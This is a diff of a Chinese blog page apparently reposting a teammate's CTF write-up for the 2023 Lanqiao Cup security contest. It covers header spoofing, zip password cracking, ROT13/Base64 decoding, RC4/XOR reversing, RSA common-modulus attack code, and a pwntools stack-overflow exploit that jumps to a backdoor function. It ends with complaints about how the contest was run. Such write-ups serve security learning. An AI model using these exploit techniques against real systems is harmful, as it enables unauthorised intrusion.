@@ -375,12 +375,12 @@
                     
                     <div class="article-tag">
                         
-                            <a href="/tags/%E8%93%9D%E6%A1%A5%E6%9D%AF/">
-                                <span class="chip bg-color">蓝桥杯</span>
-                            </a>
-                        
                             <a href="/tags/CTF/">
                                 <span class="chip bg-color">CTF</span>
+                            </a>
+                        
+                            <a href="/tags/%E8%93%9D%E6%A1%A5%E6%9D%AF/">
+                                <span class="chip bg-color">蓝桥杯</span>
                             </a>
                         
                     </div>
@@ -418,7 +418,7 @@
                 
                 <div class="info-break-policy">
                     <i class="far fa-file-word fa-fw"></i>文章字数:&nbsp;&nbsp;
-                    843
+                    848
                 </div>
                 
 
@@ -448,24 +448,28 @@
 
         <div class="card-content article-card-content">
             <div id="articleContent">
-                <h1 id="2023年蓝桥杯网络安全大赛"><a href="#2023年蓝桥杯网络安全大赛" class="headerlink" title="2023年蓝桥杯网络安全大赛"></a>2023年蓝桥杯网络安全大赛</h1><p>[TOC]</p>
-<h2 id="WP部分"><a href="#WP部分" class="headerlink" title="WP部分"></a>WP部分</h2><blockquote>
+                <h1>2023年蓝桥杯网络安全大赛</h1>
+<p>[TOC]</p>
+<h2 id="wp部分">WP部分</h2>
+<blockquote>
 <p>怎么说呢因为蓝桥杯网络安全赛事的一些奇怪操作我没有报名，队内大佬参加并拿到了非常优秀的成绩，这是直接转的人家WP</p>
 </blockquote>
-<h3 id="情报收集"><a href="#情报收集" class="headerlink" title="情报收集"></a>情报收集</h3><h4 id="禁止访问"><a href="#禁止访问" class="headerlink" title="禁止访问"></a>禁止访问</h4><p>根据源代码提示，HackBar直接修改请求头Client-IP： </p>
+<h3 id="情报收集">情报收集</h3>
+<h4 id="禁止访问">禁止访问</h4>
+<p>根据源代码提示，HackBar直接修改请求头Client-IP：</p>
 <img src=".\蓝桥杯网络安全大赛\禁止访问.png" style="zoom: 33%;" />
-
-<h3 id="数据分析"><a href="#数据分析" class="headerlink" title="数据分析"></a>数据分析</h3><h4 id="ZIP"><a href="#ZIP" class="headerlink" title="ZIP"></a>ZIP</h4><p>WireShark找到flag.zip： </p>
+<h3 id="数据分析">数据分析</h3>
+<h4 id="zip">ZIP</h4>
+<p>WireShark找到flag.zip：</p>
 <img src=".\蓝桥杯网络安全大赛\流量分析.png" style="zoom:50%;" />
-
-
-
-<p>发现需要解压密码，压缩包备注里告诉了密码的格式。使用ARCHPR破解： </p>
+<p>发现需要解压密码，压缩包备注里告诉了密码的格式。使用ARCHPR破解：</p>
 <img src=".\蓝桥杯网络安全大赛\压缩包密码爆破.png" style="zoom:50%;" />
-
-<h3 id="密码破解"><a href="#密码破解" class="headerlink" title="密码破解"></a>密码破解</h3><h4 id="CyberChef"><a href="#CyberChef" class="headerlink" title="CyberChef"></a>CyberChef</h4><p>到Cyberchef，先ROT13（好像就是凯撒密码，解密时Amount需要调整），然后解Base64：</p>
-<p><img src=".%5C%E8%93%9D%E6%A1%A5%E6%9D%AF%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%A4%A7%E8%B5%9B%5CCyberChef.png"></p>
-<h4 id="RSA"><a href="#RSA" class="headerlink" title="RSA"></a>RSA</h4><p>RSA共模攻击：</p>
+<h3 id="密码破解">密码破解</h3>
+<h4 id="cyberchef">CyberChef</h4>
+<p>到Cyberchef，先ROT13（好像就是凯撒密码，解密时Amount需要调整），然后解Base64：</p>
+<p><img src=".%5C%E8%93%9D%E6%A1%A5%E6%9D%AF%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%A4%A7%E8%B5%9B%5CCyberChef.png" alt=""></p>
+<h4 id="rsa">RSA</h4>
+<p>RSA共模攻击：</p>
 <pre class="line-numbers language-Python" data-language="Python"><code class="language-Python">from Crypto.Util.number import *
 import gmpy2
 import random
@@ -490,11 +494,13 @@ m2 &#x3D; gmpy2.powmod(m2, t, n)
 m &#x3D; m1 * m2 % n
 flag &#x3D; long_to_bytes(m)
 print(flag)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-
-<h3 id="逆向分析"><a href="#逆向分析" class="headerlink" title="逆向分析"></a>逆向分析</h3><h4 id="RC4"><a href="#RC4" class="headerlink" title="RC4"></a>RC4</h4><p>直接IDA动态调试，在main函数return时，可以看到原来变量v5的内容经过RC4被改成了flag： </p>
-<p><img src=".%5C%E8%93%9D%E6%A1%A5%E6%9D%AF%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%A4%A7%E8%B5%9B%5CRC4.png"></p>
-<h4 id="XOR"><a href="#XOR" class="headerlink" title="XOR"></a>XOR</h4><p>程序将明文和key进行异或，我们直接将密文再异或一次就得到flag。 </p>
-<p><img src=".%5C%E8%93%9D%E6%A1%A5%E6%9D%AF%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%A4%A7%E8%B5%9B%5CXOR.png"></p>
+<h3 id="逆向分析">逆向分析</h3>
+<h4 id="rc4">RC4</h4>
+<p>直接IDA动态调试，在main函数return时，可以看到原来变量v5的内容经过RC4被改成了flag：</p>
+<p><img src=".%5C%E8%93%9D%E6%A1%A5%E6%9D%AF%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%A4%A7%E8%B5%9B%5CRC4.png" alt=""></p>
+<h4 id="xor">XOR</h4>
+<p>程序将明文和key进行异或，我们直接将密文再异或一次就得到flag。</p>
+<p><img src=".%5C%E8%93%9D%E6%A1%A5%E6%9D%AF%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%A4%A7%E8%B5%9B%5CXOR.png" alt=""></p>
 <p>exp：</p>
 <pre class="line-numbers language-python" data-language="python"><code class="language-python">key <span class="token operator">=</span> <span class="token string">'SEcRET7'</span>
 enc <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">0x35</span><span class="token punctuation">,</span> <span class="token number">0x29</span><span class="token punctuation">,</span> <span class="token number">0x02</span><span class="token punctuation">,</span> <span class="token number">0x35</span><span class="token punctuation">,</span> <span class="token number">0x3E</span><span class="token punctuation">,</span> <span class="token number">0x35</span><span class="token punctuation">,</span> <span class="token number">0x0F</span><span class="token punctuation">,</span> <span class="token number">0x60</span><span class="token punctuation">,</span>
@@ -507,8 +513,9 @@ enc <span class="token operator">=</span> <span class="token punctuation">[</spa
 enc<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">^</span><span class="token operator">=</span> <span class="token builtin">ord</span><span class="token punctuation">(</span>key<span class="token punctuation">[</span>i <span class="token operator">%</span> <span class="token number">7</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
 <span class="token keyword">for</span> x <span class="token keyword">in</span> enc<span class="token punctuation">:</span>
 <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">chr</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span><span class="token punctuation">,</span> end<span class="token operator">=</span><span class="token string">''</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-
-<h3 id="漏洞挖掘分析"><a href="#漏洞挖掘分析" class="headerlink" title="漏洞挖掘分析"></a>漏洞挖掘分析</h3><h4 id="栈溢出"><a href="#栈溢出" class="headerlink" title="栈溢出"></a>栈溢出</h4><p>gets函数栈溢出漏洞，直接修改返回地址为后门函数即可： </p>
+<h3 id="漏洞挖掘分析">漏洞挖掘分析</h3>
+<h4 id="栈溢出">栈溢出</h4>
+<p>gets函数栈溢出漏洞，直接修改返回地址为后门函数即可：</p>
 <pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>
 context<span class="token punctuation">(</span>arch <span class="token operator">=</span> <span class="token string">'amd64'</span><span class="token punctuation">,</span> os <span class="token operator">=</span> <span class="token string">'linux'</span><span class="token punctuation">,</span> log_level <span class="token operator">=</span> <span class="token string">'debug'</span><span class="token punctuation">)</span>
 <span class="token comment"># p = process('./pwn')</span>
@@ -533,12 +540,12 @@ backdoor <span class="token operator">=</span> <span class="token number">0x4011
 payload <span class="token operator">=</span> <span class="token string">b'B'</span> <span class="token operator">*</span> <span class="token number">0x20</span> <span class="token operator">+</span> <span class="token string">b'deadbeef'</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>backdoor<span class="token punctuation">)</span>
 p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>
 ia<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-
-<h2 id="杂谈："><a href="#杂谈：" class="headerlink" title="杂谈："></a>杂谈：</h2><blockquote>
+<h2 id="杂谈：">杂谈：</h2>
+<blockquote>
 <p>以下为个人观点</p>
 </blockquote>
 <p>今年的蓝桥杯可以说是破事一堆，作为网安这边第一个交钱比赛的赛事，第一个双机位监考同时设有监考老师，禁止查外网，甚至禁止pip的比赛，今年的蓝桥杯网安都有开创性的意义</p>
-<p>如果我没记错的话，第一次定的时间是5月27-28，然后果不其然跟CISCN撞了，之后改时间啥啥的作为一个看乐子的人倒是看了个尽兴，同时今年一些高校，在与蓝桥杯合作的高校在没有接触过CTF的同学们中宣传本届蓝桥杯网络安全大赛…….</p>
+<p>如果我没记错的话，第一次定的时间是5月27-28，然后果不其然跟CISCN撞了，之后改时间啥啥的作为一个看乐子的人倒是看了个尽兴，同时今年一些高校，在与蓝桥杯合作的高校在没有接触过CTF的同学们中宣传本届蓝桥杯网络安全大赛…</p>
 <p>最后的结果已经是省赛能做一道题就能稳定三等奖了，团队中全栈大佬甚至在比赛中短暂登顶初赛第一，最后前五十，因为蓝桥杯在算法那边的名声在外还真有一些没接触过CTF的兄弟报名了蓝桥杯网络安全大赛，最后0解饮恨</p>
 <p>只能说不好评价也不想评价，蓝桥杯赛事主办方你开心就好</p>
 
@@ -605,12 +612,12 @@ ia<span class="token punctuation">(</span><span class="token punctuation">)</spa
                     
                         <div class="article-tag">
                             
-                                <a href="/tags/%E8%93%9D%E6%A1%A5%E6%9D%AF/">
-                                    <span class="chip bg-color">蓝桥杯</span>
-                                </a>
-                            
                                 <a href="/tags/CTF/">
                                     <span class="chip bg-color">CTF</span>
+                                </a>
+                            
+                                <a href="/tags/%E8%93%9D%E6%A1%A5%E6%9D%AF/">
+                                    <span class="chip bg-color">蓝桥杯</span>
                                 </a>
                             
                         </div>
@@ -941,7 +948,7 @@ ia<span class="token punctuation">(</span><span class="token punctuation">)</spa
             <br>
             
                 &nbsp;<i class="fas fa-chart-area"></i>&nbsp;站点总字数:&nbsp;<span
-                        class="white-color">368.4k</span>
+                        class="white-color">380.3k</span>
             
             
             
